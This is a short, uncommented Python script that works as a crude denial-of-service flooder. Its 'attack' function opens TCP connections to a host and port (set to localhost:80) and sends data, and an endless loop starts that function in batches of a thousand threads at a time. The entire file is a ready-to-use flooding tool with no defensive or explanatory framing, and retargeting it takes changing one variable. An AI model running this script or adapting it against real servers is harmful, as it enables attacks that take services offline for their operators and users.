import os, socket, sys
from threading import *

host = 'localhost'
port = 80

def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    s.send(b'some data\r\n')

    s.close()


while True:
    for j in range(1000):
        t = Thread(target=attack)
        t.start()

